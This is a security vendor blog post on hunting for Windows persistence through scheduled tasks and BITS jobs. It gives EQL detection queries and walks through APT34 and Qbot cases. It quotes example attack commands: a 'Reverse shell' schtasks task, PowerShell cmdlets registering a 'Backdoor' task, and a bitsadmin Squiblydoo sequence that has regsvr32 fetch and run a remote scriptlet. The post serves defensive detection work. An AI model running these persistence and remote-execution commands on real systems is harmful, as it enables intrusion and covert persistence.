---
title: "Adversary tradecraft 101: Hunting for persistence using Elastic Security (Part 2)"
slug: "hunting-for-persistence-using-elastic-security-part-2"
date: "2022-06-21"
description: "Learn how Elastic Endpoint Security and Elastic SIEM can be used to hunt for and detect malicious persistence techniques at scale."
author:
  - slug: brent-murphy
  - slug: david-french
  - slug: elastic-security-intelligence-analytics-team
image: "blog-thumb-shattered-lock.jpg"
category:
  - slug: adversary
---

In Part 2 of this two-part series, our goal is to provide security practitioners with better visibility, knowledge, and capabilities relative to malicious persistence techniques that impact organizations around the world every day.

[Part 1](https://www.elastic.co/blog/hunting-for-persistence-using-elastic-security-part-1) explained what persistence is and why attackers need it. It introduced the Event Query Language ([EQL](https://www.elastic.co/blog/getting-started-eql)) before showing its practical use cases for threat hunting. Finally, it examined a popular technique used by adversaries to maintain persistence, Windows Management Instrumentation (WMI) Event Subscription ([T1084](https://attack.mitre.org/techniques/T1084/)). We shared how [Elastic Security](https://www.elastic.co/security) users can hunt for and detect this technique being used in their environment.

In this post, we’ll explore two additional persistence techniques that are being used by attackers in the wild: Scheduled Tasks ([T1053](https://attack.mitre.org/techniques/T1053/)) and BITS Jobs ([T1197](https://attack.mitre.org/techniques/T1197/)). This blog assumes you've already learned a little EQL as we walk through real-world examples and provide ready-to-use detection logic for each technique.

## Persistence via scheduled tasks (T1053)

Windows provides a built-in utility called schtasks.exe that allows you to create, delete, change, run, and end tasks on a local or remote computer. Scheduled tasks run at an elevated privilege level, which means this persistence mechanism can indirectly satisfy privilege escalation (TA0004) as well. It’s important to be aware of scheduled tasks that exist in your environment (such as maintenance or backup tasks) as well as tasks created during the installation of new software (like PDF readers or browsers). It's also essential for security teams to baseline their environment, as knowing all the legitimate ways that scheduled tasks are used will help you become a more effective hunter and identify anomalies more quickly.

An adversary may attempt to abuse scheduled tasks to execute programs at startup or on a regular cadence for persistence. Threat actors like [APT34](https://attack.mitre.org/groups/G0049/), [APT29](https://attack.mitre.org/groups/G0016/), and [FIN6](https://attack.mitre.org/groups/G0037/) have been known to use scheduled tasks as a means to persist. Figure 1 depicts some of the command line parameters available to schtasks.exe, which we can use as references when analyzing task creation events.

```
/Create - creates a new scheduled task
/RU - specifies the "run as" user account
/SC - specifies the schedule frequency
/TN - specifies the string in the form of path\name which uniquely identifies this scheduled task
/TR - specifies the path and file name of the program to be run at the scheduled time
/MO - specifies how often the task runs within its schedule type
/F - forcefully creates the task and suppresses warnings if the specified task already exists
```

_Figure 1 - Portion of Windows schtasks.exe available command line parameters_

Figure 2 shows an example of a schtasks.exe command. [This example](https://lolbas-project.github.io/lolbas/Binaries/Schtasks/) is from the popular [Living Off The Land Binaries and Scripts (LOLBAS)](https://lolbas-project.github.io/) project that demonstrates how built-in, trusted Operating System utilities can be abused by adversaries to achieve their objectives. By looking at the command line parameters in the example, the task named Reverse Shell is configured to execute the binary C:\some\directory\revshell.exe every minute.

```
schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr C:\some\directory\revshell.exe /create /sc minute /mo 1 /tn "Reverse shell" /tr C:\some\directory\revshell.exe
```

_Figure 2 - Example of scheduled task creation using schtasks.exe_

Windows PowerShell also includes several [ScheduledTasks cmdlets](https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/?view=win10-ps) that can be used to create and manage scheduled tasks on Windows endpoints. Security teams can hunt for suspicious usage of these cmdlets including the ones listed in Figure 3. Organizations that have already deployed PowerShell 5.0 should consider monitoring suspicious script block logging events, Event ID 4104. A good resource on PowerShell visibility and recommended log sources to monitor can be found [here](https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html).

```
New-ScheduledTaskAction - creates a scheduled task action
New-ScheduledTaskTrigger - creates a scheduled task trigger object
Register-ScheduledTask - registers a scheduled task definition on a local computer
```

_Figure 3 - Common PowerShell cmdlets for scheduled task creations_

Figure 4 shows how these PowerShell cmdlets can be used to create and register a scheduled task.

```
PS C:\> $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Windows\Temp\backdoor.exe"
PS C:\> $T = New-ScheduledTaskTrigger -Daily -At 9am
PS C:\> $D = New-ScheduledTask -Action $A -Trigger $T
PS C:\> Register-ScheduledTask Backdoor -InputObject $D
```

_Figure 4 - PowerShell cmdlets being used to create and register a scheduled task_

## Real-world example: APT34 scheduled tasks abuse

As mentioned previously, APT34, a highly organized and technical state-sponsored threat group, is known to use scheduled tasks for persistence. The following visualization (Figure 5) depicts one of the ways a scheduled task can be used. In this case, we’re seeing the result of a victim opening a phishing lure (Step 1) — attributed to the APT34 threat group — via the Resolver view. Resolver is a critical enabler for security practitioners, as discussed in [Part 1](https://www.elastic.co/security-labs/hunting-for-persistence-using-elastic-security-part-1). In this example, the following behaviors can be observed:

- A malicious macro, embedded within a Microsoft Word document, was opened (Step 2)
- Upon opening the Word document and executing the malicious macro, the native Windows script interpreter (wscript.exe) executed a script introduced by the adversary (Step 3)
- The script created a callback to C2 while also establishing persistence via a scheduled task (Step 4)

![Figure 5 - Elastic Endpoint Security’s Resolver view showing process ancestry after a user opened a malicious Word document, leading to the configuration of a persistent scheduled task](/assets/images/hunting-for-persistence-using-elastic-security-part-2/adversary-tradecraft-101-part-2-image1.jpg)

Figure 6 depicts the command line arguments parsed from the malicious scheduled task. Every minute, the native Windows Script Host utility, wscript.exe, will execute the malicious VBScript file, AppPool.vbs, which resides in the ProgramData subdirectory.

![Figure 6 - Resolver showing command line arguments executed with schtasks.exe](/assets/images/hunting-for-persistence-using-elastic-security-part-2/adversary-tradecraft-101-part-2-image2.png)

## Hunting for scheduled tasks

With an understanding of the technique, observable artifacts, and common attributes of schtasks.exe execution, we're better prepared to succeed in our hunt for malicious scheduled task creation events. The EQL query in Figure 7 matches event sequences where the task scheduler process, schtasks.exe, is created by one of several commonly abused binaries and matches some of the command line parameters previously described. By uniquing on the command line, this allows us to focus our hunt on unique task creations and their properties.

This query matches behaviors described in our earlier APT34 example, in which schtasks.exe descended from wscript.exe. Windows script host (WSH) is a script interpreter and should generally not have many descendants. In this case, it indicates that WSH was used to interpret a JScript or VBScript object that directly or by proxy implemented a scheduled task using schtasks.exe. This EQL query can also be saved as a custom rule in Elastic Endpoint Security so that analysts can be alerted every time this activity occurs.

```
process where subtype.create and
 process_name == "schtasks.exe" and
  descendant of
   [process where process_name in ("cmd.exe", "wscript.exe", "rundll32.exe", "regsvr32.exe",
    "wmic.exe", "mshta.exe","powershell.exe")] and
   command_line == "* /create*" and
   wildcard(command_line, "*/RU*", "*/SC*", "*/TN*", "*/TR*", "*/F*")
| unique command_line
```

_Figure 7 - EQL query to search for the creation of schtasks.exe as a descendant of commonly abused processes_

In [Elastic SIEM](https://www.elastic.co/siem), we can search for the use of the scheduled tasks utility and drag and drop fields of interest into the responsive Timeline (Figure 8) for further investigation. Data from multiple indices, or data sources, can be added to the [Timeline](https://www.elastic.co/guide/en/siem/guide/current/siem-ui-overview.html) view, which enables analysts to organize leads and investigate complex threats. [Version 7.6](https://www.elastic.co/blog/elastic-stack-7-6-0-released) introduced a detection engine that included 92 out-of-the-box rules for detection in Windows, Linux, network, and APM telemetry — as well as enabling users to create their own custom rules.

![Figure 8 - Using Timeline in Elastic SIEM to investigate schtasks.exe creation events](/assets/images/hunting-for-persistence-using-elastic-security-part-2/Timeline2.gif)

## Other scheduled task considerations

Scheduled tasks may not seem sophisticated, but they are a great example of how hunters must understand the various ways that an adversary can schedule a task on a system. When shallowly monitoring a technique (i.e., only looking for use of schtasks.exe), a team can easily lull itself into a false sense of security. Understanding adversary tradecraft and having access to the relevant telemetry is crucial for successful threat hunting.

It’s important to note that there are many other ways scheduled tasks can be abused by adversaries, including offensive security tools, custom scripts, .job files, the AT command, and directly via the [Task Scheduler API](https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-reference). Elastic Security provides detections and preventions for various TTPs related to scheduled task abuse and provides API-level visibility.

In the next section, we’ll analyze BITS jobs, how they are used by attackers in the wild, and a variety of methods to identify or detect this technique.

## Persistence via BITS jobs (T1197)

Windows [Background Intelligent Transfer Service (BITS)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) is a built-in framework used to transfer files to and from web and SMB servers. Microsoft provides a utility called bitsadmin.exe and PowerShell cmdlets for managing the transfer of files.

Microsoft uses BITS to download and install updates in the background — using idle bandwidth. For example, if a user starts a Windows Update and signs out of the computer, or if a network connection is lost, BITS will resume the download automatically as soon as it is able. The capability to survive reboots makes it an ideal tool for attackers to transfer malicious files and possibly large volumes of data the actor plans to steal. Threat groups like [APT40](https://attack.mitre.org/groups/G0065/) and malware families such as the Qbot banking trojan have used BITS to transfer malicious files and set up persistence.

Figure 9 shows some [parameters](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin) that can be used with bitsadmin.exe. We can identify interesting activity by focusing on creation and transfer command line options.

```
/create - creates a transfer job with the given display name
/addfile - adds a file to the specified job
/resume - activates a new or suspended job in the transfer queue
/transfer - transfers one or more files
/SetNotifyCmdLine - sets the command that will run when the job finishes transferring data or when a job enters a state
/SetMinRetryDelay - sets the minimum length of time, in seconds, that BITS waits after encountering a transient error before trying to transfer the file
```

_Figure 9 - Parameters that can be used with the Windows bitsadmin.exe utility_

Figure 10 shows an example of how the above parameters can be used to create a BITS job. The below example from the [bitsadminexec](https://github.com/3gstudent/bitsadminexec) project demonstrates how bitsadmin.exe can be used to execute the Squiblydoo technique, discovered by [Casey Smith](https://twitter.com/subTee). Squiblydoo utilizes regsvr32.exe to download an XML file that contains scriptlets for executing code on the victim machine. This [sample](https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct) executes calc.exe, but it’s a good use case for how this could be used maliciously:

```
# create backdoor
bitsadmin /create backdoor
bitsadmin /addfile backdoor %comspec%  %temp%\cmd.exe
bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe "/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll"
bitsadmin /Resume backdoor
```

_Figure 10 - Example of using bitsadmin.exe to execute Squiblydoo_

Since BITS [version 4.0](https://docs.microsoft.com/en-us/windows/win32/bits/what-s-new) (standard in Windows Server 2008 R2 and Windows 7), PowerShell cmdlets can also be used to create and manage file transfer jobs. The PowerShell [cmdlets](https://docs.microsoft.com/en-us/windows/win32/bits/bits-powershell-commands) for BITS provide much of the same functionality as the bitsadmin.exe command line utility, a subset of which are depicted in Figure 11:

```
Add-BitsFile - add one or more files to a BITS transfer
Resume-BitsTransfer - resumes a suspended BITS transfer job
Set-BitsTransfer - modifies the properties of a BITS transfer job
Start-BitsTransfer - create and start a BITS transfer job
```

_Figure 11 - Common PowerShell cmdlets for BITS_

A good cmdlet to monitor is Start-BitsTransfer. The local and remote names of the file are specified in the Source and Destination parameters. This can be depicted as seen in Figure 12. As stated previously, analysts should monitor suspicious script block logging events, Event ID 4104, in the Microsoft-Windows-PowerShell/Operational log.

![Figure 12 - PowerShell scriptblock event from Microsoft-Windows-PowerShell/Operational log](/assets/images/hunting-for-persistence-using-elastic-security-part-2/adversary-tradecraft-101-part-2-image3.jpg)

## Hunting for malicious BITS jobs

The EQL query in Figure 13 demonstrates some of the command line arguments you might see while hunting for malicious use of bitsadmin.exe. The query searches for a process creation event for the bitsadmin.exe binary and the common command line parameters associated with the creation or transfer of a BITS job, and returns unique results based on the command line value. Focusing on unique results while hunting allows us to narrow our focus and more easily spot anomalous activity.

```
process where subtype.create and
  process_name == "bitsadmin.exe" and
  wildcard(command_line, "*Transfer*", "*Create*", "*AddFile*", "*SetNotifyCmdLine*",
                        "*SetMinRetryDelay*", "*Resume*")
| unique command_line
```

_Figure 13 - EQL query looking for common bitsadmin.exe command line parameters_

Additionally, during rule creation, you have the option to enable a "Reflex Response." With “Reflex Response,” if such behavior defined in a custom rule is detected, it uses Endpoint Security’s unique telemetry-gathering and enrichment to execute an automated response before damage and loss can occur (Figure 14). This functionality enables analysts to take action to stop the malicious behavior and then investigate the events that led up to and occurred after the threat, as opposed to investigating a current threat that may be past the point of remediation.

![Figure 14 - Reflex Response in Elastic Endpoint Security](/assets/images/hunting-for-persistence-using-elastic-security-part-2/adversary-tradecraft-101-part-2-image4.jpg)

Executing an EQL hunt in the Endpoint Security product using the EQL query from above can lead to finding real-world campaigns like Qbot, shown in Figure 15.

![Figure 15 - Results of EQL hunt in Elastic Endpoint Security](/assets/images/hunting-for-persistence-using-elastic-security-part-2/adversary-tradecraft-101-part-2-image5.png)

## Real-world example: Qbot malware

QBot is a widely distributed banking Trojan that is capable of self-replication and has historically relied on PowerShell. Recently, however, it may have been [abandoned](https://www.varonis.com/blog/varonis-discovers-global-cyber-campaign-qbot/) in favor of bitsadmin.exe — an application unlikely to be scrutinized as aggressively.

This variant utilizes a .vbs dropper by masquerading as a .doc file, as Windows still hides the original filename extension by default. Upon execution, in this case via the parent process wscript.exe, the malware spawns bitsadmin.exe to create a transfer job that downloads a subsequent payload, shown in the Timeline view in the SIEM app (Figure 16).

![Figure 16 - Process arguments from Qbot banking malware shown in the Elastic SIEM](/assets/images/hunting-for-persistence-using-elastic-security-part-2/adversary-tradecraft-101-part-2-image6.png)

Analyzing the process.args field values as depicted in Figure 17 reveals that the malware takes the following actions:

- Creates a randomly named transfer job with high priority
- Uses bitsadmin.exe to download its second stage payload from a command & control (C2) server (Note that widgetcontrol.png is actually a Windows executable)
- Base64 encodes data on the endpoint’s operating system version and antivirus software, which it passes back to C2 in the beacon URI
- Randomizes the name of the payload and writes it to a subfolder of the %AppData% path

![Figure 17 - Analysis of process arguments from Qbot banking malware](/assets/images/hunting-for-persistence-using-elastic-security-part-2/adversary-tradecraft-101-part-2-image7.png)

This example showcases how bitsadmin.exe can be used by threat actors to attempt to bypass traditional defenses by using a less common, built-in utility. This application is effectively used by threat actors for transferring files and maintaining a presence in a victim environment.

## Others BITS and pieces

The Microsoft_Windows_Bits_Cient Operational.evtx log file is a native Microsoft event log. It records every operation executed by the BITS client, either via bitsadmin.exe or PowerShell. Within that log store, Event ID 3 is used when The BITS service creates a new job. [Winlogbeat](https://www.elastic.co/downloads/beats/winlogbeat) can be configured to monitor that event.provider as shown in Figure 18. Elastic Security provides telemetry, detections, and threat hunting capabilities for BITS abuse at enterprise scale.

![Figure 18 - Microsoft-Windows-Bit-Client event from Winlogbeat](/assets/images/hunting-for-persistence-using-elastic-security-part-2/adversary-tradecraft-101-part-2-image8.png)

## Conclusion

In this blog series, we examined popular techniques that attackers use to maintain a presence in their target environments. The number of techniques in an attacker’s arsenal can seem daunting at first, but we demonstrated a formulaic approach to examining, hunting for, and detecting techniques effectively. By building comprehension around adversary tradecraft, you can identify interesting patterns, behaviors, and artifacts that you can use to your advantage.

Elastic Security makes hunting for persistence easy. The features of Elastic Endpoint Security and SIEM — along with the protections provided out of the box — lower the barriers to entry for analysts, provides detailed visibility into endpoint activity, and enables organizations to prevent, detect, and respond to malicious behavior at scale.

Try [Elastic SIEM](https://www.elastic.co/security/siem) for free today. To learn more about threat hunting, download a free copy of [The Elastic Guide to Threat Hunting](https://ela.st/threat-hunting).

View our webinar on [Hunting for persistence using Elastic Security](https://www.elastic.co/webinars/hunting-for-persistence-using-elastic-security).

Plus, [EQL support is being added to Elasticsearch](https://github.com/elastic/elasticsearch/issues/49581)!
